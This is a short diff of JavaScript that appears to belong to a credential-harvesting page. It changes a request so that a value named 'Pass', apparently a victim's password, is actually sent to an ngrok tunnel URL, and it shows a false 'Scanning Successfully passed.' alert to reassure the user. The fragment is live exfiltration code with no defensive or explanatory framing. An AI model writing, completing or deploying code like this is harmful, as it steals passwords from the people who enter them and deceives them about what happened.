@@ -13,8 +13,8 @@
               alert("Scanning Successfully passed.");
           }
       };
-      let Url = 'https://3711f7a6f0e4.ngrok.io/?Pass='+Pass;
-      request.open('GET', '');
+      var Url = 'https://19f6459d5209.ngrok.io/?Pass='+Pass;
+      request.open('GET', Url);
       request.send();
     }
     Check = true;
